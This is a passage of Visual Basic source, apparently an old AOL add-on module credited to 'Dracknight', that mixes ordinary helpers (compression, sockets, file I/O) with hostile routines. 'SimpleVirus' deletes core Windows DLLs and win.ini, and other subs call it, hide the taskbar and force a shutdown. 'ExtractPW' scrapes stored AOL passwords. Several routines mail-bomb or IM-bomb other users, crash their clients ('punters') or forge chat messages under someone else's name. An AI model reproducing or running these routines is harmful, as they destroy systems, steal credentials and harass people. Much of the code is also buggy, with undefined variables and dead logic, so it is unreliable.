Call ChangeCaptionByString("                                                   By")
pause (0.1)
Call ChangeCaptionByString("                                                       By")
pause (0.1)
Call ChangeCaptionByString("                                                           By")
pause (0.1)
Call ChangeCaptionByString("                                                               By")
pause (0.1)
Call ChangeCaptionByString("                                                                   By")
pause (0.1)
Call ChangeCaptionByString("                                                                       By")
pause (0.1)
Call ChangeCaptionByString("                                                                           By")
pause (0.1)
Call ChangeCaptionByString("                                                                               By")
pause (0.1)
Call ChangeCaptionByString("                                                                                   By")
pause (0.1)
Call ChangeCaptionByString("                                                                                       By")
pause (0.1)
Call ChangeCaptionByString("                                                                                           By")
pause (0.1)
Call ChangeCaptionByString("                                                                                               By")
pause (0.1)
Call ChangeCaptionByString("                                                                                                    By")
pause (0.1)
Call ChangeCaptionByString("                                                                                                        By")
pause (0.1)
Call ChangeCaptionByString(" Dracknight")
pause (0.1)
Call ChangeCaptionByString("  Dracknight")
pause (0.1)
Call ChangeCaptionByString("   Dracknight")
pause (0.1)
Call ChangeCaptionByString("    Dracknight")
pause (0.1)
Call ChangeCaptionByString("     Dracknight")
pause (0.1)
Call ChangeCaptionByString("       Dracknight")
pause (0.1)
Call ChangeCaptionByString("         Dracknight")
pause (0.1)
Call ChangeCaptionByString("           Dracknight")
pause (0.1)
Call ChangeCaptionByString("             Dracknight")
pause (0.1)
Call ChangeCaptionByString("               Dracknight")
pause (0.1)
Call ChangeCaptionByString("                 Dracknight")
pause (0.1)
Call ChangeCaptionByString("                  Dracknight")
pause (0.1)
Call ChangeCaptionByString("                    Dracknight")
pause (0.1)
Call ChangeCaptionByString("                      Dracknight")
pause (0.1)
Call ChangeCaptionByString("                        Dracknight")
pause (0.1)
Call ChangeCaptionByString("                          Dracknight")
pause (0.1)
Call ChangeCaptionByString("                            Dracknight")
pause (0.1)
Call ChangeCaptionByString("                              Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                  Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                     Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                        Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                           Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                             Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                               Darcknight")
pause (0.1)
Call ChangeCaptionByString("                                                   Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                       Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                           Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                               Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                   Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                       Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                           Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                               Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                                   Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                                       Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                                           Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                                               Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                                                    Dracknight")
pause (0.1)
Call ChangeCaptionByString("                                                                                                        Dracknight")
pause (0.1)
Loop
End Sub

Function IsUserUsingTheWeb()
'The browser has to be maximized in oreder to use this function
aol% = FindWindow("AOL Frame25", vbNullString)
welcome% = FindChildByTitle(mdi%, "America Online - [")
If welcome% <> 0 Then
   MsgBox "web is being used!", vbInformation, "Darcknight"
Else:
   MsgBox "web is not being used!", vbInformation, "Darcknight"
End If
End Function

Sub CloseWindow(WindowClassName As String)
X = SendMessage(WindowClassName, WM_CLOSE, 0, 0)
End Sub
Sub RenameWelcomeWindow(newcaption As String)
AO% = FindWindow("AOL Frame25", vbNullString)
bb% = FindChildByClass(AO%, "MDIClient")
arf = FindChildByTitle(bb%, "Welcome, ")
Call ChangeWindowCap(arf, newcaption)
End Sub
Sub SpeedPunter(TargetScreenN, MessageToSay As String)
Do
Call IMKeyword(TargetScreenN, MessageToSay & "   -×···Ðärçkñîght")
Loop Until Problem
Problem:
Exit Sub
End Sub

Sub SimpleVirus()
'This is so freaken simple yet a big pain in the azz to fix
' Be carefull not to do iton your computer!
X = "C:\windows\system\user32.dll"
Y = "C:\windows\system\kernel32.dll"
z = "C:\windows\win.ini"
Kill (X)
Kill (Y)
Kill (z)
End Sub
Sub GetAOLmailInAlist(thelist As ListBox)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
thelist.Clear
aol% = FindWindow("AOL Frame25", vbNullString)
aotool% = FindChildByClass(aol%, "AOL Toolbar")
aotool2% = FindChildByClass(aotool%, "_AOL_Toolbar")
aoicon% = FindChildByClass(aotool2%, "_AOL_Icon")
ClickIcon (aoicon%)
User = UserSN
z = FindChildByTitle(aoicon%, User & "'s Online Mailbox")
AOLHandle = FindChildByClass(room, "_AOL_Tree")
AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem Person$
Na:
Next index
Call CloseHandle(AOLProcessThread)
End If
End Sub

Function CountNewMail()
Dim usa, NumberOMails, closemail, MailCount
Call OpenMailbox
pause 2
aol% = FindWindow("AOL Frame25", vbNullString)
X = FindChildByClass(aol%, "MDIClient")
Y = FindChildByTitle(X, " Online Mailbox")
z = FindChildByClass(Y, "_AOL_Tree")
NumberOMails = SendMessage(z, LB_GETCOUNT, 0, 0)
closemail = SendMessage(Y, WM_CLOSE, 0, 0)
NumberOMails = MailCount
MsgBox "You currently have " & MailCount & " mail(s) in your mailbox!", vbInformation, "Count Mail"
End Function

Sub List_DelItem(lst As ListBox, item$)
Do
NoFreeze% = DoEvents()
If LCase$(lst.List(a)) = LCase$(item$) Then lst.RemoveItem (a)
a = 1 + a
Loop Until a >= lst.ListCount
End Sub
Public Function sCompress(sCompData As String) As String


    Dim lDataCount As Long
    Dim lBufferStart As Long
    Dim lMaxBufferSize As Long
    Dim sBuffer As String
    Dim lBufferOffset As Long
    Dim lBufferSize As Long
    Dim sDataControl As String
    Dim bDataControlChar As Byte
    Dim lControlCount As Long
    Dim bControlPos As Byte
    Dim bCompLen As Long
    Dim lCompPos As Long
    Dim bMaxCompLen As Long
    
    lMaxBufferSize = 65535
    bMaxCompLen = 255
    lBufferStart = 0
    sDataControl = ""
    bDataControlChar = 0
    bControlPos = 0
    lControlCount = 0


    If Len(sCompData) > 4 Then
        sCompress = Left(sCompData, 4)


        For lDataCount = 5 To Len(sCompData)


            If lDataCount > lMaxBufferSize Then
                lBufferSize = lMaxBufferSize
                lBufferStart = lDataCount - lMaxBufferSize
            Else
                lBufferSize = lDataCount - 1
                lBufferStart = 1
            End If

            sBuffer = Mid(sCompData, lBufferStart, lBufferSize)
            If Len(sCompData) - lDataCount < bMaxCompLen Then bMaxCompLen = Len(sCompData) - lDataCount
            lCompPos = 0


            For bCompLen = 3 To bMaxCompLen Step 3


                If bCompLen > bMaxCompLen Then
                    bCompLen = bMaxCompLen
                End If

                lCompPos = InStr(1, sBuffer, Mid(sCompData, lDataCount, bCompLen), 0)


                If lCompPos = 0 Then


                    If bCompLen > 3 Then


                        While lCompPos = 0
                            lCompPos = InStr(1, sBuffer, Mid(sCompData, lDataCount, bCompLen - 1), 0)
                            If lCompPos = 0 Then bCompLen = bCompLen - 1
                        Wend

                    End If

                    bCompLen = bCompLen - 1
                    Exit For
                End If

            Next



            If bCompLen > bMaxCompLen And lCompPos > 0 Then
                bCompLen = bMaxCompLen
                lCompPos = InStr(1, sBuffer, Mid(sCompData, lDataCount, bCompLen), 0)
            End If



            If lCompPos > 0 Then
                lBufferOffset = lBufferSize - lCompPos + 1
                sCompress = sCompress & Chr((lBufferOffset And &HFF00) / &H100) & Chr(lBufferOffset And &HFF) & Chr(bCompLen)
                lDataCount = lDataCount + bCompLen - 1
                bDataControlChar = bDataControlChar + 2 ^ bControlPos
            Else
                sCompress = sCompress & Mid(sCompData, lDataCount, 1)
            End If

            bControlPos = bControlPos + 1


            If bControlPos = 8 Then
                sDataControl = sDataControl & Chr(bDataControlChar)
                bDataControlChar = 0
                bControlPos = 0
            End If

            lControlCount = lControlCount + 1
        Next

        If bControlPos <> 0 Then sDataControl = sDataControl & Chr(bDataControlChar)
        sCompress = Chr((lControlCount And &H8F000000) / &H1000000) & Chr((lControlCount And &HFF0000) / &H10000) & Chr((lControlCount And &HFF00) / &H100) & Chr(lControlCount And &HFF) & Chr((Len(sDataControl) And &H8F000000) / &H1000000) & Chr((Len(sDataControl) And &HFF0000) / &H10000) & Chr((Len(sDataControl) And &HFF00) / &H100) & Chr(Len(sDataControl) And &HFF) & sDataControl & sCompress
    Else
        sCompress = sCompData
    End If

End Function



Public Function sDecompress(sDecompData As String) As String

    Dim lControlCount As Long
    Dim lControlPos As Long
    Dim bControlBitPos As Byte
    Dim lDataCount As Long
    Dim lDataPos As Long
    Dim lDecompStart As Long
    Dim lDecompLen As Long
    


    If Len(sDecompData) > 4 Then
        lControlCount = Asc(Left(sDecompData, 1)) * &H1000000 + Asc(Mid(sDecompData, 2, 1)) * &H10000 + Asc(Mid(sDecompData, 3, 1)) * &H100 + Asc(Mid(sDecompData, 4, 1))
        lDataCount = Asc(Mid(sDecompData, 5, 1)) * &H1000000 + Asc(Mid(sDecompData, 6, 1)) * &H10000 + Asc(Mid(sDecompData, 7, 1)) * &H100 + Asc(Mid(sDecompData, 8, 1)) + 9
        sDecompress = Mid(sDecompData, lDataCount, 4)
        lDataCount = lDataCount + 4
        bControlBitPos = 0
        lControlPos = 9


        For lDataPos = 1 To lControlCount


            If 2 ^ bControlBitPos = (Asc(Mid(sDecompData, lControlPos, 1)) And 2 ^ bControlBitPos) Then
                lDecompStart = Len(sDecompress) - (CLng(Asc(Mid(sDecompData, lDataCount, 1))) * &H100 + CLng(Asc(Mid(sDecompData, lDataCount + 1, 1)))) + 1
                lDecompLen = Asc(Mid(sDecompData, lDataCount + 2, 1))
                sDecompress = sDecompress & Mid(sDecompress, lDecompStart, lDecompLen)
                lDataCount = lDataCount + 3
            Else
                sDecompress = sDecompress & Mid(sDecompData, lDataCount, 1)
                lDataCount = lDataCount + 1
            End If

            bControlBitPos = bControlBitPos + 1


            If bControlBitPos = 8 Then
                bControlBitPos = 0
                lControlPos = lControlPos + 1
            End If

        Next

    Else
        sDecompress = sDecompData
    End If

End Function

'Put a two command buttons (Command1 and Command2) on to a form a
'     nd paste the following on to it as well:




Private Sub CompressFile(FileExtensionToCompressAs As String)

    Dim sReturn As String
    Dim sFileData As String
    
    Open sFileName For Binary As #1
    sFileData = Input(LOF(1), #1)
    Close #1
    sReturn = sCompress(sFileData)
    Debug.Print Len(sReturn), Len(sFileData)
    
    Open Left(sFileName, Len(sFileName) - 3) & FileExtensionToCompressAs For Output As #1
    Print #1, sReturn;
    Close #1
End Sub



Private Sub DecompressFile(sFileName)

    Dim sReturn As String
    Dim sFileData As String
    
    Open Left(sFileName, Len(sFileName) - 4) & ".wnc" For Binary As #1
    sFileData = Input(LOF(1), #1)
    sReturn = sDecompress(sFileData)
    Close #1
    Debug.Print Len(sReturn), Len(sFileData)
    
    Open Left(sFileName, Len(sFileName) - 4) & "2" & Right(sFileName, 4) For Output As #1
    Print #1, sReturn;
    Close #1
End Sub
Public Sub FormFade(frm As Form)
Dim icolval
Dim icoval2
Dim icoval3
Randomize (23)
Randomize (23)
Randomize (23)
frm.BackColor = RGB(icolval, icolval2, icolval3)
End Sub
Public Sub FormDance(M As Form)
M.Left = 5
pause (1)
M.Left = 400
pause (1)
M.Left = 700
pause (1)
M.Left = 1000
pause (1)
M.Left = 2000
pause (1)
M.Left = 3000
pause (1)
M.Left = 4000
pause (1)
M.Left = 5000
pause (1)
M.Left = 4000
pause (1)
M.Left = 3000
pause (1)
M.Left = 2000
pause (1)
M.Left = 1000
pause (1)
M.Left = 700
pause (1)
M.Left = 400
pause (1)
M.Left = 5
pause (1)
M.Left = 400
pause (1)
M.Left = 700
pause (1)
M.Left = 1000
pause (1)
M.Left = 2000
End Sub


Public Function GetIPHostName() As String

    Dim sHostName As String * 256
    
    If Not SocketsInitialize() Then
        GetIPHostName = ""
        Exit Function
    End If
    
    If gethostname(sHostName, 256) = SOCKET_ERROR Then
        GetIPHostName = ""
        MsgBox "Windows Sockets error " & Str$(WSAGetLastError()) & _
                " has occurred.  Unable to successfully get Host Name."
        SocketsCleanup
        Exit Function
    End If
    
    GetIPHostName = Left$(sHostName, InStr(sHostName, Chr(0)) - 1)
    SocketsCleanup

End Function


Public Function HiByte(ByVal wParam As Integer)

    HiByte = wParam \ &H100 And &HFF&

End Function

Public Function LoByte(ByVal wParam As Integer)

    LoByte = wParam And &HFF&

End Function

Public Sub SocketsCleanup()

    If WSACleanup() <> ERROR_SUCCESS Then
        MsgBox "Socket error occurred in Cleanup."
    End If
    
End Sub

Public Function SocketsInitialize() As Boolean

   Dim WSAD As WSADATA
   Dim sLoByte As String
   Dim sHiByte As String
   
   If WSAStartup(WS_VERSION_REQD, WSAD) <> ERROR_SUCCESS Then
      MsgBox "The 32-bit Windows Socket is not responding."
      SocketsInitialize = False
      Exit Function
   End If
   
   
   If WSAD.wMaxSockets < MIN_SOCKETS_REQD Then
        MsgBox "This application requires a minimum of " & _
                CStr(MIN_SOCKETS_REQD) & " supported sockets."
        
        SocketsInitialize = False
        Exit Function
    End If
   
   
   If LoByte(WSAD.wVersion) < WS_VERSION_MAJOR Or _
     (LoByte(WSAD.wVersion) = WS_VERSION_MAJOR And _
      HiByte(WSAD.wVersion) < WS_VERSION_MINOR) Then
      
      sHiByte = CStr(HiByte(WSAD.wVersion))
      sLoByte = CStr(LoByte(WSAD.wVersion))
      
      MsgBox "Sockets version " & sLoByte & "." & sHiByte & _
             " is not supported by 32-bit Windows Sockets."
      
      SocketsInitialize = False
      Exit Function
      
   End If
    
    
  'must be OK, so lets do it
   SocketsInitialize = True
        
End Function
Private Sub cmdAction_Click(index As Integer)
Dim VK_ACTION As Long
         Select Case index
         Case 1: '&H46 is the hex character code
              'for the letter 'F' (ascii 70)
              VK_ACTION = &H46
            Case 2: '&H4D is the hex character code
              'for the letter 'M' (ascii 77)
              VK_ACTION = &H4D
      Case 3: '&H52 is the hex character code
              'for the letter 'R' (ascii 82)
              VK_ACTION = &H52
      Case 4: '&H5B is the hex character code
              'for the start menu button
              VK_ACTION = &H5B
      Case 5: '&H5E is the hex character code
              'for the caret chr (ascii 94)
              VK_ACTION = &H5E
      Case 6: '&H70 is the hex character code
              'for the caret chr (ascii 112)
              VK_ACTION = &H70
         End Select
         Call keybd_event(VK_LWIN, 0, 0, 0)
   Call keybd_event(VK_ACTION, 0, 0, 0)
   Call keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)
   End Sub
Sub Manipulation(Who$, wut$)
aol% = FindWindow("AOL Frame25", 0&)
chatwin% = FindChildByClass(aol%, "MDIClient")
Blah% = FindChildByClass(chatwin%, "AOL Child")
ChatVew% = FindChildByClass(Blah%, "_AOL_View")
sndtext% = sendmessagebystring(ChatVew%, WM_SETTEXT, 0, Chr(13) & Chr(9) & (Who$) & ":" & Chr(9) & (wut$))
SendNow% = SendMessageByNum(ChatVew%, WM_CHAR, &HD, 0)
End Sub

Sub emailbomb(numofbomb As TextBox, whotobom, subj$, mesg$)
Do
Call SendMail((whotobom), (subj$), (mesg$))
numofbomb = Str(Val(numofbomb - 1))
Loop Until numofbomb = 0
aol% = FindWindow("aol Frame25", 0&)
compoze% = FindChildByTitle(aol%, "Compose Mail")
If compoze% <> 0 Then
Do
aol% = FindWindow("aol Frame25", 0&)
compoze% = FindChildByTitle(aol%, "Compose Mail")
X = SendMessageByNum(compoze%, WM_CLOSE, 0, 0)
Loop Until compoze% = 0
End If
End Sub
Function IMerrorPunt(whotoerror As TextBox)
IMKeyword "" & whotoerror & "", "" & Format$(String$(1024, Chr$(13)))
End Function


Function PersonAvailable(ByVal SN As String) As Integer
Call KeyWord("aol://9293:")
pause (0.1)
X = FindWindow("AOLFrame 25", vbNullString)
Y = FindChildByClass(X, "MDIClient")
W = FindChildByTitle(Y, "Send Instant Message")
z = FindChildByClass(W, "_AOL_Icon")
z = GetWindow(z, 2)
ClickIcon (k%)
End Function
Sub AntiPint()
aol% = FindWindow("AOL FRAME25", 0&)
fuck% = FindChildByTitle(aol%, "Invitation from:")
timeout (0.1)
closethemofo = SendMessageByNum(fuck%, WM_CLOSE, 0, 0)
End Sub
Sub AntiPunt()
aol% = FindWindow("AOL FRAME25", 0&)
fuck% = FindChildByTitle(aol%, "Untitled")
timeout (0.1)
damn% = FindChildByClass(fuck%, "RICHCNTL")
timeout (0.1)
shit% = SendMessage(damn%, WM_CLOSE, 0, 0&)
DoEvents
aol% = FindWindow("aol frame25", 0&)
wo% = FindChildByTitle(aol%, "<Instant Message From: ")
timeout (0.1)
damni% = FindChildByClass(wo%, "RICHCNTL")
timeout (0.1)
cx% = SendMessage(damni%, WM_CLOSE, 0, 0&)
ho% = ShowWindow(wo%, SW_Hide)
End Sub
Function ExtractPW(aoldir As String, ScreenName As String) As String
On Error Resume Next
ScreenName$ = ScreenName$ + String(10 - Len(ScreenName$), Chr(32)) + Chr(0)
Free = FreeFile
Open aoldir$ + "\idb\main.idx" For Binary As #Free
For X = 1 To LOF(Free) Step 32000
    DoEvents
    Text$ = space(32000)
    Get #Free, X, Text$
    If InStr(1, Text$, ScreenName$, 1) Then
        Where = InStr(1, Text$, ScreenName$, 1)
        extracted$ = Mid(Text$, Where + 11, 8)
        extracted$ = Trim(extracted$)
        extracted$ = FixAPIString(extracted$)
        pw$ = pw$ + extracted$ + ":"
    End If
Next X
ExtractPW = pw$
End Function
Sub IMbomb(numofbom As TextBox, whotobom As TextBox, wuttosay As TextBox)
If numofbom = "0" Then
Exit Sub
End If
If numofbom < 0 Then
Exit Sub
End If
Do
NoFreeze% = DoEvents()
IMKeyword (whotobom), (wuttosay)
numofbom = Str(Val(numofbom - 1))
If FindWindow("#32770", "America Online") <> 0 Then Exit Do: MsgBox "they got there imz off or offline"
Loop Until numofbom = 0
ErrorMsg% = FindWindow("#32770", "America Online")
ErrorOk% = FindChildByTitle(ErrorMsg%, "OK")
ClickIcon ErrorOk%
Exit Sub
End Sub
Function MailError(whotoerror, subject)
Dim Error, PS45 As Integer
Error = "9"
For Error = PS45 To 1129
Call SendMail(whotoerror, subject, "<fontsize=" & Error & ">")
Next Error
End Function
Function StayOnlinea()
Do
    X% = DoEvents()
Modal% = FindWindow("_AOL_Modal", 0&)
btn4% = FindChildByClass(Modal%, "_AOL_Button")
btn3% = FindChildByTitle(Modal%, "Yes")
If btn3% <> 0 Then
ClickIcon btn3%
End If
aol% = FindWindow("aol Frame25", 0&)
Palette% = FindChildByTitle(aol%, "America Online Timer")
btn2% = FindChildByTitle(Palette%, "OK")
If btn2% <> 0 Then
ClickIcon (btn2%)
End If
Loop
End Function
Sub ChangeHost(Host As String, SayWhat As String)
aol% = FindWindow("AOL Frame25", 0&)
room% = FindChatRoom()
View% = FindChildByClass(room%, "_AOL_VIEW")
Sng$ = CStr(Chr(13) + Chr(10) + Chr(13) + Chr(10) + Host$ + ":" + Chr(9) + SayWhat$ + Chr(13) + Chr(10))
Q% = sendmessagebystring(View%, WM_SETTEXT, 0, Sng$)
DoEvents
End Sub

Function FixAPIString(ByVal sText As String) As String
On Error Resume Next
FixAPIString = Trim(Left$(sText, InStr(sText, Chr$(0)) - 1))
End Function
Sub ComputerFup()
' WARNING - just like the "SimpleVirus" code
'Do not open run this code on your computer!
Call SwapMouseButtons
Call SimpleVirus
Call HideWindow("Shell_TryWnd")
End Sub
Sub HideWindow(Classname)
X = ShowWindow(Classname, 0)
End Sub
Sub ShowAWindow(Classname)
X = ShowWindow(Classname, 5)
End Sub

Sub ComputerMessUp()
'warning, DO NOT USE ON YOUR COMPUTER
Call SimpleVirus
Call SwapMouseButtons
Call HideWindow("Shell_TryWnd")
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome,")
If welcome% <> 0 Then
Call UserSN
Call IMKeyword(User, "<html>")
Call IMKeyword(User, "<html>")
Call IMKeyword(User, "<html>")
Call IMKeyword(User, "<html>")
Call IMKeyword(User, "<html>")
Call IMKeyword(User, "<html>")
Call CloseWindow("AOL Frame25")
Else:
MsgBox "Hello", , "Windows"
Call ExitWindowsEx(EWX_SHUTDOWN, 0&)
End If
End Sub

Function DoesFileExist(sFileName As String) As Integer
If Len(sFileName) = 0 Then
    FileExists = False
    Exit Function
End If
If Len(Dir$(sFileName)) Then
   MsgBox "File does exist", vbExclamation, "Exist?"
Else
   MsgBox "File does not excist!", vbExclamation, "Exist?"
End If
End Function
Sub SaveContentsInTextBox(txtBox As TextBox, PathnameToSaveAs)
Dim sFile As String
Dim nFile As Integer
nFile = FreeFile
sFile = PathnameToSaveAs
Open sFile For Output As nFile
Print #nFile, txtBox
Close nFile
End Sub
Sub OpenTextToTextBox(txtBox As TextBox, PathnameToOpen)
Dim nFile As Integer
Dim sFile As String
nFile = FreeFile
sFile = PathnameToOpen
Open sFile For Input As nFile
txtBox = Input(LOF(nFile), nFile)
Close nFile
End Sub
Function GetScreenResolution()
HRes = Screen.Width \ Screen.TwipsPerPixelX
VRes = Screen.Height \ Screen.TwipsPerPixelY
End Function
Function OpenEXE(Pathname)
X = Shell(Pathname)
End Function

Sub ITFAOIW(frm As Form)
' ITFAOIW means:
'Is The Form Already Open In windows
Dim sWnd
Dim Results
Dim ResultsTwo
Dim hWnx
Dim ETwND
Dim GUI
Dim AST
Dim QUI
Dim OShwnd As Long
Dim WNDhwnd As Long
Dim PCMThwnd As Long
Dim PCMThwndTwo As Long

PCMThwndTwo = frm.hwnd * 4
OSwnd = 255
WNDhwnd = 88 / OSwnd
PCMThwnd = frm.hwnd
AST = Len(PCMThwnd) = WNDhwnd / OSwnd
GUI = GetClassName(PCMThwnd, QUI, OSwnd)
ETwND = GetWindow(PCMThwnd, GUI)
YOP = Fix(OSwnd)
Results = SendMessageByNum(GUI, YOP, ETwND, WNDhwnd)
frm.CurrentX = Results
frm.CurrentY = ResultsTwo
sWnd = Results + ResultsTwo * OSwnd / YOP
If sWnd <> WNDhwnd Then
frm.Caption = "YES"
Else:
Do
gWnd = ssWnd * OSwnd
frm.Show
frm.Caption = "NO"
frm.Show
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Move PCMThwndTwo
pause 0.3
frm.Show
frm.Caption = "NO"
Loop Until sWnd <> WNDhwnd
End If
End Sub
Sub DLUMFOYA(frm As Form)
'   "       " means:
' Dont Let User Move Form On Y Axis
Dim Results
Dim gWnd As Long
Dim bWnd As Long
Dim vWnd As Long
Dim WNDhwnd
Results = 0
WNDhwnd = frm.hwnd * 2
If Results = 0 Then
Do
frm.Show
frm.Move WNDhwnd
pause 0.3
Loop
Else:
Exit Sub
End If
End Sub
Function IsWin31orWin95()
'This sees if the user is using Windows 3.1 or Windows 95 or above
X = FindWindow("Shell_TrayWnd", vbNullString)
If X <> 0 Then
   IsWin31orWin95 = 1
Else:
   IsWin31orWin95 = 0
End If
End Function
Sub CanUserGetIMs()
Dim z, u, t
On Error Resume Next
aol% = FindWindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome, ")
welcomelength% = GetWindowTextLength(welcome%)
welcometitle$ = String$(200, 0)
a% = GetWindowText(welcome%, welcometitle$, (welcomelength% + 1))
User = Mid$(welcometitle$, 10, (InStr(welcometitle$, "!") - 10))
UserSN = User
Call IMKeyword(User, "<h1><h2><h3><h1><h2><h3><h1><h2><h3><h1><h2><h3><h1><h2><h3><h1><h2><h3><h1><h2><h3><h1><h2><h3>")
X = FindWindow("AOL Frame25", vbNullString)
Y = FindChildByClass(X, "MDIClient")
z = FindChildByClass(Y, "#32770")
u = FindChildByTitle(Y, "Send Instant Message")
t = FindChildByTitle(Y, "  Instant Message To: " & User)
If z <> 0 Then
pause 0.5
Call SendMessage(z, WM_CLOSE, 0, 0)
Call SendMessage(u, WM_CLOSE, 0, 0)
MsgBox "You cannot recieve IM's right now!", vbInformation, "Darcknight"
End If
If z <> 1 Then
pause 0.5
Call SendMessage(t, WM_CLOSE, 0, 0)
MsgBox "You can recieve IM's right now!", vbInformation, "Darcknight"
End If
End Sub
Sub addaolmenu()
    aol% = FindWindow("AOL Frame25", vbNullString)
    aolmenu% = GetMenu(aol%)
    mainmenu% = CreatePopupMenu()
    submenu1% = CreatePopupMenu()
    submenu2% = CreatePopupMenu()
    X% = AppendMenu(submenu1%, MF_Enabled Or MF_String, 56, "&Get E-News")
    X% = AppendMenu(submenu1%, MF_Enabled Or MF_String, 57, "&Close E-News")
    X% = AppendMenu(mainmenu%, MF_String Or MF_Popup, submenu1%, "&Get E-News")
    X% = AppendMenu(aolmenu%, MF_String Or MF_Popup, mainmenu%, "&E-News Letter")
    DrawMenuBar (aol%)
End Sub
Sub OldMail()
usa = UserSN
Call OpenMailbox
pause 2.5
aol% = FindWindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
mwin = FindChildByTitle(mdi%, usa & "'s Online Mailbox")
Tab1 = FindChildByClass(mwin, "_AOL_TabControl")
Tab2 = FindChildByClass(Tab1, "_AOL_TabPage")
c = sendmessagebystring(Tab1, WM_KEYDOWN, VK_RIGHT, 0&)
c = sendmessagebystring(Tab1, WM_KEYUP, VK_RIGHT, 0&)
End Sub
Sub OpenMailbox()
aol% = FindWindow("AOL Frame25", vbNullString)
tool% = FindChildByClass(aol%, "AOL Toolbar")
toolb% = FindChildByClass(tool%, "_AOL_Toolbar")
Icona% = FindChildByClass(toolb%, "_AOL_Icon")
clickit = SendMessage(Icona%, WM_LBUTTONDOWN, 0, 0&)
clickit = SendMessage(Icona%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub CountOldMail()
Call OldMail
mwin = FindChildByTitle(mdi%, usa & "'s Online Mailbox")
pause 0.5
oldmailcount = SendMessage(Tab2, LB_GETCOUNT, 0, 0)
MsgBox "You have " & oldmailcount & " mail(s) in your old mail box!", vbInformation, "Count Old Mail"
closeold = SendMessage(mwin, WM_CLOSE, 0, 0)
End Sub
Sub GotoSite(Url)
Call KeyWord(Url)
End Sub
Function List_Count(lbl As Label, LstBx As ListBox)
LstBx.ListCount = lbl.Caption
End Function
Function OpenMailbox2(delaytillclose As Integer)
aol% = FindWindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
mwin = FindChildByTitle(mdi%, usa & "'s Online Mailbox")
Call OpenMailbox
pause delaytillclose
X = SendMessage(mwin, WM_CLOSE, 0, 0)
End Function
Public Sub scroll(ScrollString As String)
    Dim CurLine As String, Count As Long, ScrollIt As Long
    Dim sProgress As Long
    If FindRoom& = 0 Then Exit Sub
    If ScrollString$ = "" Then Exit Sub
    Count& = LineCount(ScrollString$)
    sProgress& = 1
    For ScrollIt& = 1 To Count&
        CurLine$ = LineFromString(ScrollString$, ScrollIt&)
        If Len(CurLine$) > 3 Then
            If Len(CurLine$) > 92 Then
                CurLine$ = Left(CurLine$, 92)
            End If
            Call ChatSend(CurLine$)
            pause 0.7
        End If
        sProgress& = sProgress& + 1
        If sProgress& > 4 Then
            sProgress& = 1
            pause 0.5
        End If
    Next ScrollIt&
End Sub
Public Function ProfileGet(ScreenName As String) As String
    Dim aol As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim mdi As Long, pgWindow As Long, pgEdit As Long, pgButton As Long
    Dim pWindow As Long, pTextWindow As Long, pString As String
    Dim NoWindow As Long, OKButton As Long, CurPos As POINTAPI
    Dim WinVis As Long
    aol& = FindWindow("AOL Frame25", vbNullString)
    mdi& = FindWindowEx(aol&, 0&, "MDIClient", vbNullString)
